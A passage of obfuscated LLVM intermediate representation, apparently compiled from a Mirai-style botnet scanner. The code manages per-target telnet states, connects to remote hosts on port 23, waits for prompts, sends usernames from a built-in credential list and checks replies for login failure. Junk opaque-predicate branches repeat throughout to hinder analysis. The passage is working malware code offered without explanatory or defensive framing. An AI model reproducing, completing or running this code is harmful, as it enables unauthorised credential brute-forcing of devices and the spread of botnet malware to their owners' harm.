  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 5
  %199 = load i8, i8* %198, align 1
  %200 = zext i8 %199 to i64
  %201 = icmp eq i64 %200, 98
  br i1 %201, label %202, label %207

; <label>:202:                                    ; preds = %182
  %203 = load i32, i32* %5, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %204
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %205, i32 0, i32 3
  store i8 1, i8* %206, align 1
  br label %1449

; <label>:207:                                    ; preds = %182
  %208 = load i32, i32* @x.85
  %209 = load i32, i32* @y.86
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %207
  %216 = load i32, i32* %5, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %217
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %218, i32 0, i32 4
  %220 = load i8, i8* %219, align 2
  %221 = zext i8 %220 to i64
  %222 = icmp eq i64 %221, 99
  %223 = load i32, i32* @x.85
  %224 = load i32, i32* @y.86
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %222, label %231, label %252

; <label>:231:                                    ; preds = %originalBBpart212
  %232 = load i32, i32* @x.85
  %233 = load i32, i32* @y.86
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %231
  %240 = load i32, i32* %5, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %241
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %242, i32 0, i32 3
  store i8 1, i8* %243, align 1
  %244 = load i32, i32* @x.85
  %245 = load i32, i32* @y.86
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %1449

; <label>:252:                                    ; preds = %originalBBpart212
  br label %253

; <label>:253:                                    ; preds = %252, %174
  br label %254

; <label>:254:                                    ; preds = %253, %154
  %255 = load i32, i32* @x.85
  %256 = load i32, i32* @y.86
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %254
  %263 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %263, align 4
  %264 = call zeroext i16 @htons(i16 zeroext 23) #13
  %265 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %264, i16* %265, align 2
  %266 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %267 = getelementptr inbounds [8 x i8], [8 x i8]* %266, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %267, i8 0, i64 8, i32 4, i1 false)
  %268 = load i32, i32* %5, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 1
  %272 = load i32, i32* %271, align 4
  %273 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %274 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %273, i32 0, i32 0
  store i32 %272, i32* %274, align 4
  %275 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %276 = load i32, i32* %5, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 0
  store i32 %275, i32* %279, align 16
  %280 = load i32, i32* %5, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 0
  %284 = load i32, i32* %283, align 16
  %285 = icmp eq i32 %284, -1
  %286 = load i32, i32* @x.85
  %287 = load i32, i32* @y.86
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %285, label %294, label %295

; <label>:294:                                    ; preds = %originalBBpart220
  br label %1449

; <label>:295:                                    ; preds = %originalBBpart220
  %296 = load i32, i32* %5, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %297
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %298, i32 0, i32 0
  %300 = load i32, i32* %299, align 16
  %301 = load i32, i32* %5, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 16
  %306 = call i32 (i32, i32, ...) @fcntl(i32 %305, i32 3, i8* null)
  %307 = or i32 %306, 2048
  %308 = call i32 (i32, i32, ...) @fcntl(i32 %300, i32 4, i32 %307)
  %309 = load i32, i32* %5, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %310
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %311, i32 0, i32 0
  %313 = load i32, i32* %312, align 16
  %314 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %315 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %315, %struct.sockaddr** %314, align 8
  %316 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %317 = load %struct.sockaddr*, %struct.sockaddr** %316, align 8
  %318 = call i32 @connect(i32 %313, %struct.sockaddr* %317, i32 16)
  %319 = icmp eq i32 %318, -1
  br i1 %319, label %320, label %344

; <label>:320:                                    ; preds = %295
  %321 = call i32* @__errno_location() #13
  %322 = load i32, i32* %321, align 4
  %323 = icmp ne i32 %322, 115
  br i1 %323, label %324, label %344

; <label>:324:                                    ; preds = %320
  %325 = load i32, i32* @x.85
  %326 = load i32, i32* @y.86
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %324
  %333 = load i32, i32* %5, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %334
  call void @reset_telstate(%struct.telstate_t* %335)
  %336 = load i32, i32* @x.85
  %337 = load i32, i32* @y.86
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %348

; <label>:344:                                    ; preds = %320, %295
  %345 = load i32, i32* %5, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %346
  call void @advance_telstate(%struct.telstate_t* %347, i32 1)
  br label %348

; <label>:348:                                    ; preds = %344, %originalBBpart224
  br label %1432

; <label>:349:                                    ; preds = %139
  %350 = load i32, i32* @x.85
  %351 = load i32, i32* @y.86
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %349
  %358 = load i32, i32* @x.85
  %359 = load i32, i32* @y.86
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %366

; <label>:366:                                    ; preds = %originalBBpart228
  %367 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %368 = getelementptr inbounds [16 x i64], [16 x i64]* %367, i64 0, i64 0
  %369 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %368) #2, !srcloc !6
  %370 = extractvalue { i64, i64* } %369, 0
  %371 = extractvalue { i64, i64* } %369, 1
  %372 = trunc i64 %370 to i32
  store i32 %372, i32* %22, align 4
  %373 = ptrtoint i64* %371 to i64
  %374 = trunc i64 %373 to i32
  store i32 %374, i32* %23, align 4
  br label %375

; <label>:375:                                    ; preds = %366
  %376 = load i32, i32* @x.85
  %377 = load i32, i32* @y.86
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %375
  %384 = load i32, i32* @x.85
  %385 = load i32, i32* @y.86
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %392

; <label>:392:                                    ; preds = %originalBBpart232
  %393 = load i32, i32* @x.85
  %394 = load i32, i32* @y.86
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %392
  %401 = load i32, i32* %5, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 0
  %405 = load i32, i32* %404, align 16
  %406 = srem i32 %405, 64
  %407 = zext i32 %406 to i64
  %408 = shl i64 1, %407
  %409 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %410 = load i32, i32* %5, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %411
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %412, i32 0, i32 0
  %414 = load i32, i32* %413, align 16
  %415 = sdiv i32 %414, 64
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds [16 x i64], [16 x i64]* %409, i64 0, i64 %416
  %418 = load i64, i64* %417, align 8
  %419 = or i64 %418, %408
  store i64 %419, i64* %417, align 8
  %420 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %420, align 8
  %421 = load i32, i32* %3, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %422, i64* %423, align 8
  %424 = load i32, i32* %5, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 0
  %428 = load i32, i32* %427, align 16
  %429 = add nsw i32 %428, 1
  %430 = call i32 @select(i32 %429, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %430, i32* %6, align 4
  %431 = load i32, i32* %6, align 4
  %432 = icmp eq i32 %431, 1
  %433 = load i32, i32* @x.85
  %434 = load i32, i32* @y.86
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBBpart278, label %originalBB34alteredBB

originalBBpart278:                                ; preds = %originalBB34
  br i1 %432, label %441, label %473

; <label>:441:                                    ; preds = %originalBBpart278
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %442 = load i32, i32* %5, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %443
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %444, i32 0, i32 0
  %446 = load i32, i32* %445, align 16
  %447 = bitcast i32* %15 to i8*
  %448 = call i32 @getsockopt(i32 %446, i32 1, i32 4, i8* %447, i32* %14) #2
  %449 = load i32, i32* %15, align 4
  %450 = icmp ne i32 %449, 0
  br i1 %450, label %451, label %455

; <label>:451:                                    ; preds = %441
  %452 = load i32, i32* %5, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %453
  call void @reset_telstate(%struct.telstate_t* %454)
  br label %472

; <label>:455:                                    ; preds = %441
  %456 = load i32, i32* %5, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 0
  %460 = load i32, i32* %459, align 16
  %461 = load i32, i32* %5, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %462
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %463, i32 0, i32 0
  %465 = load i32, i32* %464, align 16
  %466 = call i32 (i32, i32, ...) @fcntl(i32 %465, i32 3, i8* null)
  %467 = and i32 %466, -2049
  %468 = call i32 (i32, i32, ...) @fcntl(i32 %460, i32 4, i32 %467)
  %469 = load i32, i32* %5, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %470
  call void @advance_telstate(%struct.telstate_t* %471, i32 2)
  br label %472

; <label>:472:                                    ; preds = %455, %451
  br label %1449

; <label>:473:                                    ; preds = %originalBBpart278
  %474 = load i32, i32* @x.85
  %475 = load i32, i32* @y.86
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %473
  %482 = load i32, i32* %6, align 4
  %483 = icmp eq i32 %482, -1
  %484 = load i32, i32* @x.85
  %485 = load i32, i32* @y.86
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %483, label %492, label %496

; <label>:492:                                    ; preds = %originalBBpart282
  %493 = load i32, i32* %5, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %494
  call void @reset_telstate(%struct.telstate_t* %495)
  br label %1449

; <label>:496:                                    ; preds = %originalBBpart282
  %497 = load i32, i32* @x.85
  %498 = load i32, i32* @y.86
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %496
  %505 = load i32, i32* @x.85
  %506 = load i32, i32* @y.86
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %513

; <label>:513:                                    ; preds = %originalBBpart286
  %514 = load i32, i32* @x.85
  %515 = load i32, i32* @y.86
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %513
  %522 = load i32, i32* %5, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %523
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %524, i32 0, i32 7
  %526 = load i32, i32* %525, align 16
  %527 = add i32 %526, 5
  %528 = zext i32 %527 to i64
  %529 = call i64 @time(i64* null) #2
  %530 = icmp slt i64 %528, %529
  %531 = load i32, i32* @x.85
  %532 = load i32, i32* @y.86
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBBpart299, label %originalBB88alteredBB

originalBBpart299:                                ; preds = %originalBB88
  br i1 %530, label %539, label %559

; <label>:539:                                    ; preds = %originalBBpart299
  %540 = load i32, i32* @x.85
  %541 = load i32, i32* @y.86
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %539
  %548 = load i32, i32* %5, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %549
  call void @reset_telstate(%struct.telstate_t* %550)
  %551 = load i32, i32* @x.85
  %552 = load i32, i32* @y.86
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br label %559

; <label>:559:                                    ; preds = %originalBBpart2103, %originalBBpart299
  br label %1432

; <label>:560:                                    ; preds = %139
  %561 = load i32, i32* %5, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %562
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %563, i32 0, i32 0
  %565 = load i32, i32* %564, align 16
  %566 = load i32, i32* %3, align 4
  %567 = load i32, i32* %5, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %568
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %569, i32 0, i32 9
  %571 = load i8*, i8** %570, align 8
  %572 = call i32 @read_until_response(i32 %565, i32 %566, i8* %571, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %573 = icmp ne i32 %572, 0
  br i1 %573, label %574, label %607

; <label>:574:                                    ; preds = %560
  %575 = load i32, i32* @x.85
  %576 = load i32, i32* @y.86
  %577 = sub i32 %575, 1
  %578 = mul i32 %575, %577
  %579 = urem i32 %578, 2
  %580 = icmp eq i32 %579, 0
  %581 = icmp slt i32 %576, 10
  %582 = or i1 %580, %581
  br i1 %582, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %574
  %583 = load i32, i32* %5, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %584
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %585, i32 0, i32 9
  %587 = load i8*, i8** %586, align 8
  %588 = call i32 @contains_fail(i8* %587)
  %589 = icmp ne i32 %588, 0
  %590 = load i32, i32* @x.85
  %591 = load i32, i32* @y.86
  %592 = sub i32 %590, 1
  %593 = mul i32 %590, %592
  %594 = urem i32 %593, 2
  %595 = icmp eq i32 %594, 0
  %596 = icmp slt i32 %591, 10
  %597 = or i1 %595, %596
  br i1 %597, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br i1 %589, label %598, label %602

; <label>:598:                                    ; preds = %originalBBpart2107
  %599 = load i32, i32* %5, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %600
  call void @advance_telstate(%struct.telstate_t* %601, i32 0)
  br label %606

; <label>:602:                                    ; preds = %originalBBpart2107
  %603 = load i32, i32* %5, align 4
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %604
  call void @advance_telstate(%struct.telstate_t* %605, i32 3)
  br label %606

; <label>:606:                                    ; preds = %602, %598
  br label %1449

; <label>:607:                                    ; preds = %560
  %608 = load i32, i32* %5, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %609
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %610, i32 0, i32 7
  %612 = load i32, i32* %611, align 16
  %613 = add i32 %612, 7
  %614 = zext i32 %613 to i64
  %615 = call i64 @time(i64* null) #2
  %616 = icmp slt i64 %614, %615
  br i1 %616, label %617, label %621

; <label>:617:                                    ; preds = %607
  %618 = load i32, i32* %5, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %619
  call void @reset_telstate(%struct.telstate_t* %620)
  br label %621

; <label>:621:                                    ; preds = %617, %607
  %622 = load i32, i32* @x.85
  %623 = load i32, i32* @y.86
  %624 = sub i32 %622, 1
  %625 = mul i32 %622, %624
  %626 = urem i32 %625, 2
  %627 = icmp eq i32 %626, 0
  %628 = icmp slt i32 %623, 10
  %629 = or i1 %627, %628
  br i1 %629, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %621
  %630 = load i32, i32* @x.85
  %631 = load i32, i32* @y.86
  %632 = sub i32 %630, 1
  %633 = mul i32 %630, %632
  %634 = urem i32 %633, 2
  %635 = icmp eq i32 %634, 0
  %636 = icmp slt i32 %631, 10
  %637 = or i1 %635, %636
  br i1 %637, label %originalBBpart2111, label %originalBB109alteredBB

originalBBpart2111:                               ; preds = %originalBB109
  br label %1432

; <label>:638:                                    ; preds = %139
  %639 = load i32, i32* @x.85
  %640 = load i32, i32* @y.86
  %641 = sub i32 %639, 1
  %642 = mul i32 %639, %641
  %643 = urem i32 %642, 2
  %644 = icmp eq i32 %643, 0
  %645 = icmp slt i32 %640, 10
  %646 = or i1 %644, %645
  br i1 %646, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %638
  %647 = load i32, i32* %5, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %648
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %649, i32 0, i32 0
  %651 = load i32, i32* %650, align 16
  %652 = load i32, i32* %5, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 4
  %656 = load i8, i8* %655, align 2
  %657 = zext i8 %656 to i64
  %658 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %657
  %659 = load i8*, i8** %658, align 8
  %660 = load i32, i32* %5, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %661
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %662, i32 0, i32 4
  %664 = load i8, i8* %663, align 2
  %665 = zext i8 %664 to i64
  %666 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %665
  %667 = load i8*, i8** %666, align 8
  %668 = call i64 @strlen(i8* %667) #10
  %669 = call i64 @send(i32 %651, i8* %659, i64 %668, i32 16384)
  %670 = icmp slt i64 %669, 0
  %671 = load i32, i32* @x.85
  %672 = load i32, i32* @y.86
  %673 = sub i32 %671, 1
  %674 = mul i32 %671, %673
  %675 = urem i32 %674, 2
  %676 = icmp eq i32 %675, 0
  %677 = icmp slt i32 %672, 10
  %678 = or i1 %676, %677
  br i1 %678, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br i1 %670, label %679, label %699

; <label>:679:                                    ; preds = %originalBBpart2115
  %680 = load i32, i32* @x.85
  %681 = load i32, i32* @y.86
  %682 = sub i32 %680, 1
  %683 = mul i32 %680, %682
  %684 = urem i32 %683, 2
  %685 = icmp eq i32 %684, 0
  %686 = icmp slt i32 %681, 10
  %687 = or i1 %685, %686
  br i1 %687, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %679
  %688 = load i32, i32* %5, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %689
  call void @reset_telstate(%struct.telstate_t* %690)
  %691 = load i32, i32* @x.85
  %692 = load i32, i32* @y.86
  %693 = sub i32 %691, 1
  %694 = mul i32 %691, %693
  %695 = urem i32 %694, 2
  %696 = icmp eq i32 %695, 0
  %697 = icmp slt i32 %692, 10
  %698 = or i1 %696, %697
  br i1 %698, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br label %1449

; <label>:699:                                    ; preds = %originalBBpart2115
  %700 = load i32, i32* @x.85
  %701 = load i32, i32* @y.86
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %699
  %708 = load i32, i32* %5, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 0
  %712 = load i32, i32* %711, align 16
  %713 = call i64 @send(i32 %712, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i32 0, i32 0), i64 2, i32 16384)
  %714 = icmp slt i64 %713, 0
  %715 = load i32, i32* @x.85
  %716 = load i32, i32* @y.86
  %717 = sub i32 %715, 1
  %718 = mul i32 %715, %717
  %719 = urem i32 %718, 2
  %720 = icmp eq i32 %719, 0
  %721 = icmp slt i32 %716, 10
  %722 = or i1 %720, %721
  br i1 %722, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br i1 %714, label %723, label %743

; <label>:723:                                    ; preds = %originalBBpart2123
  %724 = load i32, i32* @x.85
  %725 = load i32, i32* @y.86
  %726 = sub i32 %724, 1
  %727 = mul i32 %724, %726
  %728 = urem i32 %727, 2
  %729 = icmp eq i32 %728, 0
  %730 = icmp slt i32 %725, 10
  %731 = or i1 %729, %730
  br i1 %731, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %723
  %732 = load i32, i32* %5, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i64 %733
